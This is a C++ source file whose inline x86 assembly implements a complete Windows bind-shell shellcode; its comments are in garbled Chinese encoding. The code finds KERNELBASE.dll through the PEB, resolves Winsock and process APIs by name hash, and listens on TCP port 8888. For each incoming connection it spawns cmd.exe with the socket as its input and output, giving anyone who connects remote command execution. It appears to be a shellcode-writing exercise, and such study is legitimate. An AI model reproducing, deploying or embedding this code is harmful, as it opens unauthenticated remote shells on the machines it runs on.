#include <iostream>

void __declspec(naked) AsmBindShellCode()
{
	__asm
	{
		push ebp
		pushad
		sub ebp, 0x1000
		sub esp, 0x1000
		mov ebp, esp

		sub esp, 0x500 // ��������ռ� 500���ֽ�  ��ͬʱ����ebp��esp�Ŀռ� 
		// �ַ���
		// ws2_32.dll  77 73 32 5F  33 32 2E 64  6C 6C 00    ����0x0A
		// cmd.exe  63 6D 64 2E  65 78 65 00    ����0x8
		// KERNELBASE.dll 84871AB2
		// LoadLibraryExA C0D83287

		// �����ռ�
		/*

		-500 �ݸ�WSADATAʹ��һ��

		-190 STARTUPINFOA 68 0x44

		-100 PROCESS_INFORMATION 16 0x10
	
		-44 ��� CloseHandle ������ַ
		-40 ����µ�socket
		-3c ��� CreateProcessA ������ַ
		-38 ��� accept ������ַ
		-34  SOCKADDR_IN 16���ֽ�

		-24 SOCKET
		-20 ws2_32ģ���ַ
		-1c �ַ��� cmd.exe

		-14 �ַ��� ws2_32.dll

		-8 LoadLibraryExA ������ַ
		-4 kernelbase ģ���ַ
		*/

		// �����ַ���
		mov dword ptr[ebp - 0x0c], 0x6c6c
		mov dword ptr[ebp - 0x10], 0x642e3233
		mov dword ptr[ebp - 0x14], 0x5f327377

		mov dword ptr[ebp - 0x18], 0x657865
		mov dword ptr[ebp - 0x1C], 0x2e646d63

		// ��ȡKERNELBASE.dll��ģ���ַ
		call func_get_kernelbase_dll
		mov[ebp - 0x4], eax // ���ģ���ַ 

		// ��ȡ LoadLibraryExA ������ַ
		push 0xC0D83287
		push [ebp - 0x4]
		call func_GetProcAddress
		mov[ebp - 0x8], eax

		// ���� ws2_32.dll
		push 0x8
		push 0
		lea esi, [ebp - 0x14]
		push esi
		call [ebp - 0x8]
		mov [ebp - 0x20], eax  // ws2_32ģ���ַ

		//////////////start 
		// ��ȡ WSAStartup ������ַ  80B46A3D
		push 0x80B46A3D
		push dword ptr[ebp - 0x20]
		call func_GetProcAddress
		// ���� WSAStartup
		lea esi, [ebp - 0x500]
		push esi
		push 0x0202
		call eax

		// ��ȡ WSASocketA ������ַ DE78322D
		push 0xDE78322D
		push dword ptr[ebp - 0x20]
		call func_GetProcAddress
		// ���� WSASocketA
		push 0
		push 0
		push 0
		push 0x6
		push 0x1
		push 0x2
		call eax
		mov [ebp - 0x24], eax // ���socket

		// SOCKADDR_IN ��ʼ�� -34 
		mov  word ptr[ebp - 0x34], 0x2
		mov  word ptr[ebp - 0x32], 0xB822
		mov  dword ptr [ebp - 0x30], 0
		// ��ȡbind bind DDA71064
		push 0xDDA71064
		push dword ptr[ebp - 0x20]
		call func_GetProcAddress

		push 0x10
		lea esi, [ebp - 0x34]
		push esi
		push [ebp - 0x24] // socket
		call eax

		// ����listen  4BD39F0C
		push 0x4BD39F0C
		push dword ptr[ebp - 0x20]
		call func_GetProcAddress

		push 0x10
		push [ebp - 0x24] // socket
		call eax

		// accept 1971EB1
		push 0x01971EB1
		push dword ptr[ebp - 0x20]
		call func_GetProcAddress
		mov [ebp - 0x38], eax // ���accept ������ַ

		push 0x6BA6BCC9
		push dword ptr[ebp - 0x4] // kernelbase
		call func_GetProcAddress
		mov[ebp - 0x3C], eax // ��� CreateProcessA ������ַ  6BA6BCC9

		push 0xFF0D6657
		push dword ptr[ebp - 0x4] // kernelbase
		call func_GetProcAddress
		mov[ebp - 0x44], eax // ��� CloseHandle  ������ַ  FF0D6657
			
		//- 44 ��� CloseHandle ������ַ
		//- 40 ����µ�socket
		//- 3c ��� CreateProcessA ������ַ
		//- 38 ��� accept ������ַ
	tag_loop_Socket_start:

		// accept
		push 0
		push 0
		push [ebp - 0x24]
		call [ebp - 0x38]
		mov [ebp - 0x40],eax  // ����µ�socket

		//- 190 STARTUPINFOA 68 0x44
		//- 4c PROCESS_INFORMATION 16 0x10
		// ��ʼ���ṹ�� STARTUPINFOA
		lea edi, [ebp - 0x100]
		xor eax, eax
		mov ecx, 0x4
		cld
		rep stosd

		lea edi,[ebp-0x190]
		xor eax,eax
		mov ecx,0x11
		cld
		rep stosd

		mov dword ptr[ebp - 0x190], 0x44
		mov dword ptr[ebp - 0x164], 0x100
		mov word ptr[ebp - 0x160], 0x0
		mov esi, [ebp - 0x40] // �µ�socket
		mov dword ptr[ebp - 0x158], esi
		mov dword ptr[ebp - 0x154], esi
		mov dword ptr[ebp - 0x150], esi

		// CreateProcessA  [ebp - 0x3C]
		lea edi, [ebp - 0x100]
		push edi  // PROCESS_INFORMATION
		lea edi, [ebp - 0x190]
		push edi // STARTUPINFOA
		push 0
		push 0
		push 0
		push 1
		push 0
		push 0
		lea edi, [ebp - 0x1C] // cmd.exe
		push edi
		push 0
		call [ebp - 0x3C]

		// close handle
		push dword ptr[ebp - 0x100]
		call [ebp - 0x44]
		push dword ptr [ebp - 0x0FC]
		call [ebp - 0x44]
		jmp tag_loop_Socket_start
		//////////////////////////////////

		mov esp, ebp
		popad
		pop ebp
		retn
		// func_GetProcAddress ����pe, ��ȡ����ָ�� start=====
		// ����1 imageBase ģ���ַ 
		// ����2 funcName  �������� hash�������
	func_GetProcAddress:
			push ebp
			mov ebp, esp
			sub esp, 0x1c // ��������ռ�

			push ebx
			push ecx
			push edx
			push esi

			// ����pe -- �ҵ�����Ŀ¼��λ�� -- ��һ��Ϊ������
			mov edx, [ebp + 0x8] // ��һ������ ģ���ַ
			mov esi, [edx + 0x3c] // if_new
			lea esi, [esi + edx] // ntͷ
			mov esi, [esi + 0x78] // ����Ŀ¼��rva �� DataDirectory�ֶ�����λ��
			lea esi, [esi + edx] // ����Ŀ¼��va
			// ������������
			mov edi, [esi + 0x1c] // EAT ������ַ�� rva
			lea edi, [edi + edx] // EAT va
			mov[ebp - 0x4], edi // �浽�ֲ�����
			mov edi, [esi + 0x20] // ENT �������Ʊ� rva
			lea edi, [edi + edx] // ENT va
			mov[ebp - 0x8], edi // �浽�ֲ�����
			mov edi, [esi + 0x24] // EOT ������ű� rva
			lea edi, [edi + edx] // EOT va
			mov[ebp - 0x0C], edi // �浽�ֲ�����

			// ѭ���ʹ����������Ƚ�
			xor ecx, ecx
		func_GetProcAddress_getAddr_loop :
			mov esi, [ebp - 0x8] // ENT
			mov esi, [esi + ecx * 4] // rva
			lea esi, [edx + esi] // ���������ַ�����ַ
			// ����hash char
			push esi
			call func_compute_hash
			cmp eax, [ebp + 0x0c] // �ʹ���ĺ������ƱȽ� 
			je func_GetProcAddress_getAddr_loop_end
			inc ecx
			jmp func_GetProcAddress_getAddr_loop
			func_GetProcAddress_getAddr_loop_end :
			// ����ű�͵�ַ���õ���ַ
			mov esi, [ebp - 0x0c] // EOT
			xor edi, edi
			mov di, [esi + ecx * 2] // EAT ������
			mov ebx, [ebp - 0x4] // EAT
			mov esi, [ebx + edi * 4] // ������ַrva
			lea eax, [esi + edx]  // func addr

			pop esi
			pop edx
			pop ecx
			pop ebx

			mov esp, ebp
			pop ebp
			retn 0x8
			// func_GetProcAddress ����pe ��ȡ����ָ�� end=====



		

			// func_compute_hash ����char*�ַ�����hash���� start====stdcall
			// ����1: �ַ����׵�ַ
		func_compute_hash: // ����һ���ַ�����ַ stdcall
		push ebp
			mov ebp, esp

			sub esp, 0x4 // �������ֽڿռ�
			mov dword ptr[ebp - 0x4], 0

			push ebx
			push ecx
			push edx
			push esi

			mov esi, [ebp + 0x08] // �����ĵ�ַ, ���ַ�����ַ
			// ��[ebp-0x4]���digest  ecx ���ѭ��index 
			xor ecx, ecx
			xor edx, edx
			xor ebx, ebx
			tag_loop_start : // eax ��al����ֽ�  ebx edx����м����
		xor eax, eax
			mov al, [esi + ecx]
			test al, al
			jz end_func_compute_hash    // �Ƚ��Ƿ��ַ�����β
			mov ebx, dword ptr[ebp - 0x4]
			mov edx, dword ptr[ebp - 0x4]
			shl edx, 25
			shr ebx, 7
			or edx, ebx
			add edx, eax
			inc ecx
			mov dword ptr[ebp - 0x4], edx
			jmp tag_loop_start
			end_func_compute_hash :
			pop esi
			pop edx
			pop ecx
			pop ebx

			mov eax, [ebp - 0x4]
			mov esp, ebp
			pop ebp
			retn 0x4
		// func_compute_hash ����char*�ַ�����hash���� end====stdcall
		// 
		// func_compute_hash_wchar ����wchar_t�ַ�����hash���� start====stdcall
		// ����1: �ַ����׵�ַ
		// 

			// func_get_kernelbase_dll ��ȡdll��ģ���ַ start=====
			//  ����1: dll���Ƶ�hashֵ DWORD
			func_get_kernelbase_dll: //
			push ebp
			mov ebp, esp
			sub esp, 0x4 // ��������ռ�

			push ebx
			push ecx
			push edx
			push esi
			
			mov esi, fs: [0x30] // PEB
			mov esi, [esi + 0x0c] // LDR�ṹ��ָ��
			mov esi, [esi + 0x1c] // list
			// ��ʼ�����б� �ӵڶ��ʼ ��һ����ntdll
			func_getDll_BaseAddr_getmodule :
			mov esi, [esi]
			mov ebx, [esi + 0x20] // dll������ wchar
			// ����dll���Ƶ�hashֵ  	push 0x84871AB2
			push ebx
			call func_compute_hash_wchar
			cmp eax, 0x84871AB2 // ��dll���Ƶ�hash�ʹ���ĵ�һ�������Ƚ�
			je func_getDll_BaseAddr_end
			jmp func_getDll_BaseAddr_getmodule
			func_getDll_BaseAddr_end :
			mov eax, [esi + 0x08] // dll��ģ���ַ

			pop esi
			pop edx
			pop ecx
			pop ebx

			mov esp, ebp
			pop ebp
			retn 0x4
			// func_getDll_BaseAddr ��ȡdll��ģ���ַ end=====
		func_compute_hash_wchar:
			push ebp
			mov ebp, esp
			push ecx
			mov dword ptr ss : [ebp - 0x4] , 0x0
			func_compute_hash_wchar_tag1 :
			mov eax, dword ptr ss : [ebp + 0x8]
			movzx ecx, word ptr ds : [eax]
			test ecx, ecx
			je func_compute_hash_wchar_tag_end
			mov edx, dword ptr ss : [ebp - 0x4]
			shl edx, 0x19
			mov eax, dword ptr ss : [ebp - 0x4]
			shr eax, 0x7
			or edx, eax
			mov dword ptr ss : [ebp - 0x4] , edx
			mov ecx, dword ptr ss : [ebp + 0x8]
			movzx edx, word ptr ds : [ecx]
			add edx, dword ptr ss : [ebp - 0x4]
			mov dword ptr ss : [ebp - 0x4] , edx
			mov eax, dword ptr ss : [ebp + 0x8]
			add eax, 0x2
			mov dword ptr ss : [ebp + 0x8] , eax
			jmp func_compute_hash_wchar_tag1
			func_compute_hash_wchar_tag_end :
			mov eax, dword ptr ss : [ebp - 0x4]
			mov esp, ebp
			pop ebp
			retn 0x4
		// func_compute_hash_wchar ����wchar_t�ַ�����hash���� end======stdcall
		/////////////////////////////////


	}
}

int mainA33()
{
	printf("helloworld\n");
	AsmBindShellCode();
	printf("end\n");
	return 0;
}